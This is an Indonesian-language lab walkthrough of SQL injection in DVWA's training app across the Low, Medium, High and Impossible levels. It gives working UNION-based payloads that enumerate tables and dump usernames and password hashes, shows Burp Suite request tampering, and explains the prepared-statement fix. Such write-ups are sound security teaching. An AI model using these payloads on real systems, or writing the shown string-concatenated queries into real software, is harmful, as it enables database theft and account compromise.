## Intro

### Apa itu SQL Injection?

SQL Injection adalah serangan di mana penyerang menyisipkan perintah SQL berbahaya ke dalam kolom input yang seharusnya hanya menerima data biasa, seperti angka ID atau nama pengguna. Bayangkan kamu punya buku tamu di kantor dan setiap tamu diminta menulis namanya. Tapi ada tamu nakal yang bukan menulis namanya, melainkan menulis "... atau tampilkan semua data rahasia di lemari arsip." Jika petugas di sana tidak teliti dan langsung menjalankan instruksi tersebut, seluruh arsip bisa bocor. Itulah gambaran SQL Injection.

**SQL** *(Structured Query Language)* adalah bahasa yang digunakan aplikasi web untuk berkomunikasi dengan database-nya. Contoh perintah SQL sederhana yang dijalankan aplikasi ketika kamu mencari data user dengan ID 1:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1';
```

Jika input tidak dijaga, penyerang bisa memanipulasi perintah di atas menjadi sesuatu yang jauh lebih berbahaya.

### Bagaimana Cara Kerjanya?

Serangan ini memanfaatkan cara aplikasi menyusun query SQL secara dinamis, yaitu dengan menggabungkan string input pengguna langsung ke dalam perintah SQL. Ketika penyerang memasukkan karakter khusus seperti tanda kutip tunggal (`'`), karakter tersebut dapat "memecah" struktur query asli dan menyisipkan perintah tambahan.

Sebagai contoh, jika aplikasi menyusun query seperti ini:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```

Dan penyerang memasukkan `a' UNION SELECT username, password FROM users-- -`, maka query yang dieksekusi database menjadi:

```sql
SELECT first_name, last_name FROM users WHERE user_id = 'a'
UNION SELECT username, password FROM users-- -';
```

Tanda `-- -` di akhir berfungsi sebagai komentar SQL yang "mematikan" sisa query asli agar tidak menimbulkan error. Hasilnya: seluruh username dan password di database ikut tertampil.

### Mengapa Bisa Rentan (Vulnerable)?

Kerentanan SQL Injection muncul bukan karena databasenya yang salah, melainkan karena **kesalahan developer dalam menangani input dari pengguna**. Beberapa penyebab umumnya adalah:

+ **Input tidak divalidasi**: Aplikasi menerima begitu saja apapun yang diketik pengguna tanpa memeriksa apakah isinya aman atau mengandung karakter berbahaya.

+ **Query disusun secara dinamis**: Developer membangun query dengan cara menggabungkan string secara langsung (`"SELECT * FROM users WHERE id = '" . $id . "'"`) sehingga input pengguna menjadi bagian dari perintah SQL.

+ **Tidak menggunakan Prepared Statement**: Teknik Prepared Statement memisahkan antara perintah SQL dan datanya, sehingga input pengguna tidak pernah bisa "menjadi" bagian dari perintah. Sayangnya teknik ini sering diabaikan.

+ **Pesan error database tampil ke user**: Pesan error yang ditampilkan ke layar memberikan informasi berharga kepada penyerang tentang struktur database dan jenis query yang digunakan.

### Apa Dampaknya Jika Berhasil Dieksploitasi?

SQL Injection masuk dalam **OWASP Top 10** — daftar 10 kerentanan web paling berbahaya di dunia. Jika berhasil dieksploitasi, dampaknya bisa sangat serius:

+ **Kebocoran Data Sensitif**: Penyerang dapat membaca seluruh isi database, termasuk username, password, email, nomor kartu kredit, hingga data pribadi pengguna.

+ **Bypass Autentikasi (Login Tanpa Password)**: Dengan memanipulasi query login, penyerang bisa masuk ke akun manapun tanpa mengetahui passwordnya sama sekali.

+ **Modifikasi dan Penghapusan Data**: Penyerang dapat mengubah, menambah, atau menghapus data di database menggunakan perintah `INSERT`, `UPDATE`, atau `DELETE`.

+ **Eksekusi Perintah di Sistem Operasi Server**: Pada konfigurasi database tertentu, penyerang bahkan bisa menjalankan perintah langsung di sistem operasi server yang menjalankan database tersebut.

+ **Shutdown Database**: Penyerang dapat mematikan layanan database sehingga seluruh aplikasi tidak dapat beroperasi sama sekali.

## DVWA SQL Injection

Di DVWA terdapat modul SQL Injection yang menyediakan berbagai skenario kerentanan dengan empat tingkat kesulitan. Tujuan dari modul ini adalah satu: **mencuri password dari 5 user yang ada di database** (user ID 1 sampai 5). Teknik utama yang akan kita gunakan adalah **UNION-based SQL Injection**.

### **Level Low**

![Tampilan halaman SQL Injection level Low](/assets/image/2026-02-04-sqli/image1.png)

Pada level ini, aplikasi menerima input ID pengguna melalui URL (method GET) dan langsung memasukkannya ke dalam query SQL tanpa filter apapun. Inilah kondisi SQL Injection paling dasar dan paling mudah dieksploitasi.

Bagian kode yang rentan ada di sini:

```php
$id = $_REQUEST[ 'id' ];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

Variabel `$id` langsung diambil dari request pengguna dan disisipkan begitu saja ke dalam query. Tidak ada validasi, tidak ada sanitasi, tidak ada proteksi sama sekali.

**Langkah 1 — Konfirmasi Kerentanan**

Pertama kita pastikan dulu bahwa input form ini memang rentan. Masukkan tanda kutip tunggal di field ID:

```
'
```

Jika muncul pesan error MySQL di layar, itu konfirmasi bahwa aplikasi rentan — tanda kutip kita berhasil "memecah" struktur query asli.

![Pesan error SQL setelah memasukkan tanda kutip](/assets/image/2026-02-04-sqli/image2.png)

**Langkah 2 — Temukan Jumlah Kolom**

Sebelum menggunakan UNION SELECT, kita harus tahu berapa kolom yang dikembalikan query asli. Caranya dengan `ORDER BY` dan terus naikkan angkanya sampai muncul error:



```
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -
```

Ketika `ORDER BY 3` menghasilkan error tapi `ORDER BY 2` tidak, berarti query asli mengembalikan **2 kolom**. Ini sesuai dengan `SELECT first_name, last_name` di kode sumbernya.

**Langkah 3 — Temukan Posisi Kolom yang Tampil**

Kita perlu tahu kolom mana yang hasilnya ditampilkan ke layar. Uji dengan:

```
a' UNION SELECT "KOLOM1","KOLOM2"-- -
```

Jika teks `KOLOM1` dan `KOLOM2` muncul di halaman, berarti kedua kolom tersebut ditampilkan. Kita bisa menggunakan keduanya untuk mengekstrak data.

![Output UNION SELECT dengan marker KOLOM1 dan KOLOM2](/assets/image/2026-02-04-sqli/image3.png)

**Langkah 4 — Ambil Informasi Database**

Sekarang kita mulai ekstrak informasi. Pertama, cari tahu nama database yang sedang digunakan:

```
a' UNION SELECT database(), version()-- -
```

![Output nama database dan versi MySQL](/assets/image/2026-02-04-sqli/image4.png)

**Langkah 5 — Ambil Nama Tabel**

Gunakan tabel sistem `information_schema` untuk melihat semua tabel yang ada di database tersebut:

```
a' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database()-- -
```

![Daftar nama tabel di dalam database](/assets/image/2026-02-04-sqli/image5.png)

**Langkah 6 — Ambil Nama Kolom dari Tabel `users`**

Setelah tahu ada tabel `users`, kita intip kolom apa saja yang ada di dalamnya:

```
a' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users'-- -
```

![Daftar kolom dari tabel users](/assets/image/2026-02-04-sqli/image6.png)

**Langkah 7 — Dump Username dan Password**

Saatnya mengambil data yang kita cari. Kolom `user` dan `password` sudah teridentifikasi:

```
a' UNION SELECT user, password FROM users-- -
```

![Output username dan password hash semua user](/assets/image/2026-02-04-sqli/image7.png)

Semua username dan password hash dari 5 user berhasil terdump. Password yang muncul dalam format **MD5 hash** bisa di-crack menggunakan tools online seperti CrackStation atau tools lokal seperti `hashcat`.


### **Level Medium**

![Tampilan halaman SQL Injection level Medium dengan dropdown](/assets/image/2026-02-04-sqli/image8.png)

Level Medium mencoba memperbaiki keamanan dengan dua cara: mengganti kolom input teks menjadi dropdown list, dan menambahkan fungsi `mysqli_real_escape_string()`. Sekilas terlihat lebih aman, tapi ada celah yang luput dari perhatian developer.

```php
$id = $_POST[ 'id' ];
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

Fungsi `mysqli_real_escape_string()` memang men-escape karakter berbahaya seperti tanda kutip (`'`). Tapi perhatikan query-nya: `WHERE user_id = $id` — **tidak ada tanda kutip** mengapit variabel `$id`. Karena tidak ada tanda kutip, escaping tanda kutip menjadi tidak relevan. Penyerang tetap bisa menyisipkan perintah SQL tanpa perlu menggunakan tanda kutip sama sekali. Selain itu, dropdown list bisa dengan mudah dilewati dengan menggunakan **Burp Suite** untuk mencegat dan memodifikasi request sebelum sampai ke server.

**Langkah 1 — Intercept Request dengan Burp Suite**

Aktifkan intercept di Burp Suite. Pilih salah satu angka dari dropdown dan klik Submit. Request POST yang dikirim akan tertangkap di Burp.

![Request POST yang tertangkap di Burp Suite](/assets/image/2026-02-04-sqli/image9.png)

**Langkah 2 — Modifikasi Parameter `id`**

Di Burp Suite, ubah nilai parameter `id` di body request. Karena query tidak menggunakan tanda kutip, payload kita pun tidak perlu tanda kutip:

```
1 UNION SELECT 1,2-- -
```

Kirim request yang sudah dimodifikasi dan lihat apakah angka `1` dan `2` muncul di halaman — konfirmasi UNION berhasil.

![Edit parameter id di Burp Suite Repeater](/assets/image/2026-02-04-sqli/image10.png)
![Edit parameter id di Burp Suite Repeater](/assets/image/2026-02-04-sqli/image10a.png)

**Langkah 3 — Dump Username dan Password**

Sama seperti level Low, tapi tanpa tanda kutip dalam payload:

```
1 UNION SELECT user,password FROM users-- -
```

![Hasil dump username dan password melalui Burp Suite](/assets/image/2026-02-04-sqli/image11.png)
![Hasil dump username dan password melalui Burp Suite](/assets/image/2026-02-04-sqli/image11a.png)

Seluruh data berhasil terekstrak meskipun ada dropdown list dan `mysqli_real_escape_string()`.


### **Level High**

![Tampilan halaman SQL Injection level High](/assets/image/2026-02-04-sqli/image12.png)

Level High secara mekanis sangat mirip dengan level Low — query yang digunakan sama-sama rentan. Bedanya, input kini dimasukkan melalui **halaman terpisah** dan nilai dikirim via session cookie, bukan langsung melalui URL. Teknik ini dirancang untuk mempersulit otomatisasi serangan (misalnya oleh tools seperti sqlmap), tapi tidak mencegah serangan manual.

```php
$id = $_SESSION[ 'id' ];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
```

Input diambil dari session, tapi tetap disisipkan langsung ke dalam query tanpa sanitasi. Penambahan `LIMIT 1` hanya membatasi baris yang dikembalikan oleh bagian pertama query — bukan bagian UNION SELECT yang kita tambahkan.

**Langkah 1 — Buka Halaman Input Terpisah**

Klik link *"Click here to change your ID"* yang tersedia di halaman. Sebuah pop-up atau halaman baru akan muncul, di situlah kita memasukkan ID.

![Pop-up halaman input ID pada level High](/assets/image/2026-02-04-sqli/image13.png)

**Langkah 2 — Masukkan Payload di Halaman Input**

Di kolom input halaman terpisah tersebut, masukkan payload yang sama seperti level Low:

```
a' UNION SELECT user,password FROM users-- -
```

![Memasukkan payload di halaman input terpisah](/assets/image/2026-02-04-sqli/image14.png)

**Langkah 3 — Lihat Hasil di Halaman Utama**

Setelah submit, kembali ke halaman utama SQL Injection. Hasil eksploitasi akan muncul di sana.

![Output username dan password semua user di level High](/assets/image/2026-02-04-sqli/image15.png)

Meskipun inputnya melewati halaman yang berbeda dan disimpan di session, hasilnya sama saja — seluruh data user berhasil terekstrak.

### **Level Impossible (Aman)**

![Tampilan halaman SQL Injection level Impossible](/assets/image/2026-02-04-sqli/image16.png)

Level Impossible adalah implementasi yang benar. Semua kerentanan pada level-level sebelumnya sudah diperbaiki secara menyeluruh dengan kombinasi beberapa teknik sekaligus.

Berikut kode yang digunakan:

```php
$id = $_GET[ 'id' ];
if(is_numeric( $id )) {
    $id = intval($id);
    $data = $db->prepare('SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;');
    $data->bindParam(':id', $id, PDO::PARAM_INT);
    $data->execute();
}
```

Ada empat lapis pertahanan yang bekerja bersamaan di sini. Pertama, `is_numeric()` memastikan input hanya bisa lolos jika berupa angka — karakter apapun seperti tanda kutip atau huruf akan langsung ditolak. Kedua, `intval()` mengkonversi paksa input ke tipe integer, sehingga tidak ada celah karakter tersisa. Ketiga dan paling penting, `$db->prepare()` dikombinasikan dengan `bindParam()` adalah teknik **Prepared Statement** — query dan data diproses secara terpisah oleh database, sehingga input pengguna tidak akan pernah bisa "menjadi" bagian dari perintah SQL apapun yang dimasukkan. Keempat, token Anti-CSRF melindungi dari serangan Cross-Site Request Forgery.

**Percobaan Bypass**

Coba masukkan payload yang berhasil di level sebelumnya:

```
a' UNION SELECT user,password FROM users-- -
```

![Tidak ada output atau error berarti di level Impossible](/assets/image/2026-02-04-sqli/image17.png)

Tidak ada yang terjadi. Tidak ada error, tidak ada data yang bocor. Input langsung ditolak oleh `is_numeric()` sebelum bahkan menyentuh database.

## KESIMPULAN

SQL Injection adalah serangan yang memanfaatkan input pengguna yang tidak divalidasi untuk menyisipkan perintah SQL berbahaya ke dalam query database. Satu baris kode yang tidak hati-hati bisa membuka seluruh database kepada penyerang.

Level Low membuktikan bahwa tanpa validasi apapun, penyerang bebas menjalankan query SQL apapun — mulai dari membaca nama tabel, kolom, hingga dump seluruh username dan password dalam hitungan menit.

Level Medium menunjukkan bahwa proteksi setengah-setengah lebih berbahaya dari yang terlihat. `mysqli_real_escape_string()` yang diimplementasikan tanpa tanda kutip di query menjadi tidak berguna sama sekali, dan pembatasan UI berupa dropdown dapat dilewati dengan mudah menggunakan Burp Suite.

Level High memperlihatkan bahwa mempersulit alur input dengan halaman terpisah dan session bukanlah perbaikan keamanan yang nyata jika query di sisi server tetap rentan terhadap injeksi.

Level Impossible mendemonstrasikan cara yang benar: kombinasi validasi tipe data (`is_numeric` + `intval`) dengan Prepared Statement (`prepare` + `bindParam`) membuat SQL Injection secara fundamental tidak mungkin berhasil, karena database sudah mampu membedakan mana perintah SQL dan mana data input pengguna.
